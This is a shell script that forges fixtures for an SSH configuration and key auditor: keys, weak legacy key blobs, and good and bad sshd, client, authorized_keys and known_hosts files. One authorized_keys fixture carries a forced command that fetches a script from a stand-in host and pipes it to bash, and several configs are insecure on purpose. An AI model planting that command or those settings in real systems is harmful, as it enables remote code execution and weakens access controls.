#!/usr/bin/env bash
# forge.sh — regenerate every fixture from scratch.
# requires: ssh-keygen (openssh) and python3. fixtures/ ships pre-forged,
# this script documents provenance and lets CI re-derive them.
set -euo pipefail
cd "$(dirname "$0")/fixtures"

ssh-keygen -t ed25519 -N ""      -C "analyst@lab" -f id_ed25519 -q
ssh-keygen -t ed25519 -N "secretpw" -C "caged@lab" -f id_enc    -q
ssh-keygen -t rsa     -b 2048  -N ""      -C "old@lab"     -f id_rsa2048 -q
ssh-keygen -t rsa     -b 1024  -N ""      -C "weak@lab"    -f id_rsa1024 -q
ssh-keygen -t ecdsa   -b 256   -N ""      -C "ecc@lab"     -f id_ecdsa  -q

# handcrafted wire blobs: 512-bit rsa and a dss key, both far past retirement
python3 - <<'PY'
import base64, struct
def s(b): return struct.pack('>I', len(b)) + b
def mpint(n):
    by = n.to_bytes((n.bit_length()+7)//8 or 1, 'big')
    return s(b'\x00'+by if by[0] & 0x80 else by)
blob = s(b'ssh-rsa') + mpint(65537) + mpint(int.from_bytes(b'\xd5'*64, 'big'))
dblob = s(b'ssh-dss') + mpint(int.from_bytes(b'\xdd'*128, 'big')) + mpint(2) + mpint(3) + mpint(4)
open('weak_blob.pub','w').write(
    'ssh-rsa ' + base64.b64encode(blob).decode() + ' planted-512\n'
    'ssh-dss ' + base64.b64encode(dblob).decode() + ' legacy-dsa\n')
PY

pub() { cat "$1.pub"; }
printf '%s\n%s\n' "$(pub id_ed25519)" "$(pub id_ecdsa)" > ak_clean
printf '%s\n' "command=\"bash -c 'curl -s http://x.y/p|bash'\" $(pub id_rsa2048)" > ak_min
printf '%s\n' "command=\"git-shell -c \$SSH_ORIGINAL_COMMAND\",restrict $(pub id_rsa2048)" > ak_jail
printf '%s\n' "command=\"/usr/bin/git-shell -c \$SSH_ORIGINAL_COMMAND\",no-pty $(pub id_rsa2048)" > ak_git
printf '%s\n' "from=\"*\",no-pty $(pub id_rsa2048)" > ak_broad
printf '%s\n' "$(pub id_ed25519)" > ak_dupA
printf '%s\n' "$(pub id_ed25519)" > ak_dupB
printf '%s\n' "@cert-authority *.prod $(pub id_ed25519)" > ak_ca
printf '%s\n' "expiry-time=\"20240101\" $(pub id_ed25519)" > ak_expired
printf '%s\n' "this is not a key" "$(pub id_ed25519)" > ak_badline

cat > sshd_weak <<'CONF'
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
AuthorizedKeysFile /var/lib/bits/ak
AuthorizedKeysCommand /usr/local/bin/fetch-keys %u
PermitUserEnvironment yes
Ciphers aes256-cbc,arcfour
KexAlgorithms diffie-hellman-group1-sha1
MACs hmac-md5
X11Forwarding yes
GatewayPorts yes
Include /tmp/extra/sshd.conf
Subsystem sftp internal-sftp
BogusDirective yes
CONF
cat > sshd_ok <<'CONF'
Port 22
PermitRootLogin no
PasswordAuthentication no
PermitEmptyPasswords no
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
KexAlgorithms curve25519-sha256,sntrup761x25519-sha512@openssh.com
MACs hmac-sha2-256-etm@openssh.com
X11Forwarding no
AllowUsers deploy git
CONF
cat > client_bad <<'CONF'
Host *
  StrictHostKeyChecking no
  UserKnownHostsFile /dev/null
  ForwardAgent yes
  ProxyCommand nc -X connect %h %p
Host bastion
  HostName 10.0.0.9
  IdentityFile ~/.ssh/id_ed25519
CONF
cat > client_ok <<'CONF'
Host bastion
  HostName 10.0.0.9
  User deploy
  IdentityFile ~/.ssh/id_ed25519_bastion
  StrictHostKeyChecking yes
Host *
  HashKnownHosts yes
  ServerAliveInterval 60
CONF

python3 - <<'PY'
import hmac, hashlib, base64
def hh(host, salt=b'FIXEDSALT12345678'):
    h = hmac.new(salt, host.encode(), hashlib.sha1).digest()
    return '|1|' + base64.b64encode(salt).decode().rstrip('=') + '|' + base64.b64encode(h).decode().rstrip('=')
ed = open('id_ed25519.pub').read().split()
ec = open('id_ecdsa.pub').read().split()
lines = [
    hh('gitlab.com') + ' ssh-ed25519 ' + ed[1] + ' hashed-ok',
    '@cert-authority *.prod ' + ed[0] + ' ' + ed[1] + ' prod-ca',
    '@revoked dead.box ' + ec[0] + ' ' + ec[1],
    '[jump.example.com]:2222 ' + ed[0] + ' ' + ed[1],
    'web01.internal ' + ec[0] + ' ' + ec[1],
    'web01.internal ' + ed[0] + ' ' + ed[1],
    'plain.host ' + ed[0] + ' ' + ed[1],
    'plain.host ' + ed[0] + ' ' + ed[1],
]
open('known_full','w').write('\n'.join(lines) + '\n')
hashed = [hh('gitlab.com') + ' ssh-ed25519 ' + ed[1],
          hh('build.internal') + ' ' + ed[0] + ' ' + ed[1]]
open('known_hashed','w').write('\n'.join(hashed) + '\n')
PY

echo "fixtures forged: $(ls | wc -l) files"
